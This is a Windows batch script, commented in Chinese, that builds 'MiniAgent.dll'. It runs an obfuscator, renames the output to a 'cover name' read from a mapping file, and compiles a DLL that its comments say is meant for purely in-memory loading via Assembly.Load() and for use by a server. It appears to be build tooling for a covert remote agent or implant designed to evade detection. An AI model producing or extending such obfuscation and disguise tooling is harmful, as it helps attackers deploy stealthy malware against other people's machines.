@echo off
REM 编译 MiniAgent.dll — 使用 .NET Framework 4.x 内置 csc.exe
REM 输出 ~40KB DLL，可通过 Assembly.Load() 纯内存加载

set CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
if not exist "%CSC%" (
    echo [!] csc.exe not found at %CSC%
    echo [!] Trying .NET SDK...
    where dotnet >nul 2>nul && (
        dotnet build -c Release
        goto :eof
    )
    exit /b 1
)

echo [*] Running obfuscator...
python "%~dp0obfuscate.py"
if %ERRORLEVEL% NEQ 0 (
    echo [!] Obfuscation failed
    exit /b 1
)

REM 从映射文件读取伪装名称
set COVER_NAME=MiniAgent
for /f "tokens=1,* delims==" %%A in (MiniAgent_mapping.txt) do (
    if "%%A"=="COVER_NAME" set COVER_NAME=%%B
)
set OUT_DLL=%COVER_NAME%.dll

echo [*] Compiling %OUT_DLL% (obfuscated)...
"%CSC%" /target:library /out:%OUT_DLL% /optimize+ /nologo ^
    /reference:System.dll ^
    /reference:System.Core.dll ^
    /reference:System.Management.dll ^
    /reference:System.Net.Http.dll ^
    /reference:System.Drawing.dll ^
    MiniAgent_obf.cs

if %ERRORLEVEL% EQU 0 (
    for %%F in (%OUT_DLL%) do echo [+] OK: %%~nxF  %%~zF bytes
    REM 同时复制为 MiniAgent.dll 供服务器使用
    copy /Y %OUT_DLL% MiniAgent.dll >nul
    echo [+] Copied to MiniAgent.dll
) else (
    echo [!] Build failed
)
